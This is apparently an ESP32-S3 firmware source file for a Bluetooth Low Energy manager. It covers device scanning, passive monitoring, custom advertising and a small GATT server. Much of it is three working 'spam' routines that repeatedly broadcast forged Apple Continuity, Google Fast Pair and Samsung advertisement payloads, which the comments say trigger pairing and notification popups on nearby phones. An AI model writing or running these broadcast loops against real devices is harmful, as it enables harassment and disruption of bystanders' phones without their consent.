#include "bt_manager.h"

// ── Scan Callback ─────────────────────────────────────────────

class GWScanCallback : public BLEAdvertisedDeviceCallbacks {
public:
  BTManager* mgr;
  void onResult(BLEAdvertisedDevice dev) override {
    if (mgr->bleDeviceCount >= 64) return;
    BLERecord& r = mgr->bleDevices[mgr->bleDeviceCount++];
    strncpy(r.address, dev.getAddress().toString().c_str(), 17); r.address[17] = '\0';
    strncpy(r.name, dev.haveName() ? dev.getName().c_str() : "(unnamed)", 31); r.name[31] = '\0';
    r.rssi       = dev.getRSSI();
    r.appearance = dev.haveAppearance() ? dev.getAppearance() : 0;
    strncpy(r.manufacturer,
      dev.haveManufacturerData() ? dev.getManufacturerData().c_str() : "", 31);
    r.manufacturer[31] = '\0';
    strncpy(r.serviceUUID,
      dev.haveServiceUUID() ? dev.getServiceUUID().toString().c_str() : "", 39);
    r.serviceUUID[39] = '\0';

    if (mgr->monitoring) {
      Serial.printf("  [BLE] %-17s  rssi:%-4d  %s\n",
        r.address, r.rssi, r.name);
    }
  }
};

static GWScanCallback _bleCb;

// ── Lifecycle ────────────────────────────────────────────────

void BTManager::begin() {
  BLEDevice::init(FW_NAME);
  _pScan = BLEDevice::getScan();
  _pScan->setActiveScan(true);
  _pScan->setInterval(100);
  _pScan->setWindow(99);
  _bleCb.mgr = this;
  _pScan->setAdvertisedDeviceCallbacks(&_bleCb, true);
  Serial.println("[BT] BLE stack ready (ESP32-S3: BLE only).");
}

void BTManager::stop() {
  stopBLEAdvertise();
  stopGATTServer();
  if (_pScan) _pScan->stop();
}

// ── Scanning ─────────────────────────────────────────────────

void BTManager::bleScan(uint8_t durationSec) {
  bleDeviceCount = 0;
  Serial.printf("[BLE SCAN] Scanning %d seconds...\n", durationSec);
  _pScan->start(durationSec, false);
  Serial.printf("[BLE SCAN] Done. %d device(s) found.\n", bleDeviceCount);
  _pScan->clearResults();
}

void BTManager::printBLEDevices() {
  if (bleDeviceCount == 0) { Serial.println("  No devices. Run 'blescan'."); return; }
  Serial.println("  #   Address            RSSI  Appearance  Name");
  Serial.println("  --- -----------------  ----  ----------  ----------------------------");
  for (int i = 0; i < bleDeviceCount; i++) {
    Serial.printf("  %-3d %-17s  %-4d  0x%04X      %s\n",
      i, bleDevices[i].address, bleDevices[i].rssi,
      bleDevices[i].appearance, bleDevices[i].name);
    if (strlen(bleDevices[i].serviceUUID) > 0)
      Serial.printf("          SVC: %s\n", bleDevices[i].serviceUUID);
  }
}

// ── BLE Advertising ───────────────────────────────────────────

void BTManager::bleAdvertiseCustom(const char* name, uint16_t appearance) {
  if (_advertising) stopBLEAdvertise();
  BLEDevice::setDeviceName(name);
  BLEAdvertising* adv = BLEDevice::getAdvertising();
  BLEAdvertisementData data;
  data.setName(name);
  data.setFlags(0x06);
  if (appearance) data.setAppearance(appearance);
  adv->setAdvertisementData(data);
  adv->setScanResponse(true);
  adv->setMinInterval(BLE_ADV_INTERVAL_MS);
  adv->setMaxInterval(BLE_ADV_INTERVAL_MS + 100);
  adv->start();
  _advertising = true;
  Serial.printf("[BLE ADV] Advertising as \"%s\" appearance:0x%04X\n", name, appearance);
}

void BTManager::bleSpamAppleProximity() {
  // Apple Continuity Protocol device type bytes — publicly documented
  // by security researchers. Generates iOS system notification popups.
  const struct { uint8_t type; const char* label; } appleTypes[] = {
    {0x27, "AirPods Pro"},  {0x09, "AirPods Max"},
    {0x0E, "AirPods Gen2"}, {0x13, "AirPods Gen3"},
    {0x02, "iPhone Handoff"},{0x05, "AirDrop"},
  };
  Serial.println("[BLE] Apple proximity spam — press any key to stop.");
  uint8_t idx = 0;
  while (!Serial.available()) {
    uint8_t payload[31] = {0};
    payload[0] = 0x1E;
    payload[1] = 0xFF;          // Manufacturer specific
    payload[2] = 0x4C; payload[3] = 0x00; // Apple Company ID
    payload[4] = appleTypes[idx].type;
    payload[5] = 0x19;
    esp_fill_random(payload + 6, 6);
    payload[10] = 0x20;
    esp_ble_gap_config_adv_data_raw(payload, sizeof(payload));
    Serial.printf("  [->] %s\n", appleTypes[idx].label);
    idx = (idx + 1) % 6;
    delay(120);
  }
  BLEDevice::getAdvertising()->stop();
  _advertising = false;
  Serial.println("[BLE] Apple spam stopped.");
}

void BTManager::bleSpamGoogleFastPair() {
  // Google Fast Pair uses BLE service UUID 0xFE2C + 3-byte model ID.
  // Publicly documented; known model IDs cause Android pairing dialogs.
  const uint32_t modelIDs[] = {
    0xD7965A,  // Generic headphones
    0x55AD16,  // Pixel Buds A
    0x82B223,  // JBL Live 300
    0x718FA4,  // Sony WH-1000XM
    0xF67E03   // Google Home Mini
  };
  Serial.println("[BLE] Google Fast Pair spam — press any key to stop.");
  uint8_t idx = 0;
  while (!Serial.available()) {
    uint32_t model = modelIDs[idx % 5];
    uint8_t payload[12] = {
      0x02, 0x01, 0x02,       // Flags: LE General Discoverable
      0x03, 0x03, 0x2C, 0xFE, // Complete 16-bit UUID: 0xFE2C Fast Pair
      0x04, 0x16, 0x2C, 0xFE, // Service data header
      0x00
    };
    payload[9]  = (model >> 16) & 0xFF;
    payload[10] = (model >> 8)  & 0xFF;
    payload[11] = model & 0xFF;
    esp_ble_gap_config_adv_data_raw(payload, sizeof(payload));
    Serial.printf("  [->] Model 0x%06X\n", model);
    idx++;
    delay(150);
  }
  BLEDevice::getAdvertising()->stop();
  _advertising = false;
  Serial.println("[BLE] Google Fast Pair spam stopped.");
}

void BTManager::bleSpamSamsungFastPair() {
  // Samsung uses manufacturer ID 0x0075 with device type bytes.
  // Triggers Galaxy wearable pairing popups on Android.
  const struct { uint8_t b1; uint8_t b2; const char* label; } samsungTypes[] = {
    {0x01, 0x21, "Galaxy Buds2 Pro"},
    {0x01, 0x2C, "Galaxy Buds Live"},
    {0x01, 0x2E, "Galaxy Buds Pro"},
    {0x01, 0x30, "Galaxy Buds2"},
    {0x01, 0x60, "Galaxy Watch 5"},
  };
  Serial.println("[BLE] Samsung Fast Pair spam — press any key to stop.");
  uint8_t idx = 0;
  while (!Serial.available()) {
    uint8_t payload[13] = {
      0x02, 0x01, 0x02,             // Flags
      0x09, 0xFF,                   // Manufacturer specific, length 9
      0x75, 0x00,                   // Samsung Company ID (0x0075)
      samsungTypes[idx].b1, samsungTypes[idx].b2,
      0x00, 0x00, 0x00, 0x00
    };
    esp_fill_random(payload + 9, 4);
    esp_ble_gap_config_adv_data_raw(payload, sizeof(payload));
    Serial.printf("  [->] %s\n", samsungTypes[idx].label);
    idx = (idx + 1) % 5;
    delay(130);
  }
  BLEDevice::getAdvertising()->stop();
  _advertising = false;
  Serial.println("[BLE] Samsung spam stopped.");
}

void BTManager::stopBLEAdvertise() {
  if (!_advertising) return;
  BLEDevice::getAdvertising()->stop();
  _advertising = false;
  Serial.println("[BLE] Advertising stopped.");
}

// ── GATT Server ───────────────────────────────────────────────

class GWServerCb : public BLEServerCallbacks {
  void onConnect(BLEServer* s) override {
    Serial.printf("  [GATT] Client connected. Total: %d\n", s->getConnectedCount());
  }
  void onDisconnect(BLEServer* s) override {
    Serial.printf("  [GATT] Client disconnected. Total: %d\n", s->getConnectedCount());
    BLEDevice::getAdvertising()->start();
  }
};
static GWServerCb _srvCb;

void BTManager::startGATTServer() {
  _pServer = BLEDevice::createServer();
  _pServer->setCallbacks(&_srvCb);
  BLEService* svc = _pServer->createService(BLEUUID((uint16_t)0x1800));
  BLECharacteristic* c = svc->createCharacteristic(
    BLEUUID((uint16_t)0x2A00), BLECharacteristic::PROPERTY_READ);
  c->setValue(FW_NAME " " FW_VERSION);
  svc->start();
  BLEAdvertising* adv = BLEDevice::getAdvertising();
  adv->addServiceUUID(BLEUUID((uint16_t)0x1800));
  adv->setScanResponse(true);
  adv->start();
  Serial.printf("[GATT] Server running as \"%s\". Waiting for connections...\n", FW_NAME);
}

void BTManager::stopGATTServer() {
  if (!_pServer) return;
  BLEDevice::getAdvertising()->stop();
  _pServer = nullptr;
  Serial.println("[GATT] Server stopped.");
}

// ── Passive Monitor ───────────────────────────────────────────

void BTManager::startPassiveMonitor() {
  monitoring = true;
  bleDeviceCount = 0;
  _pScan->setActiveScan(false);  // passive = no SCAN_REQ
  _pScan->start(0, false);       // 0 = continuous
  Serial.println("[BLE MONITOR] Passive sniff started — press any key to stop.");
}

void BTManager::stopPassiveMonitor() {
  monitoring = false;
  _pScan->stop();
  _pScan->setActiveScan(true);
  Serial.printf("[BLE MONITOR] Stopped. %d unique devices seen.\n", bleDeviceCount);
}

BTManager btMgr;
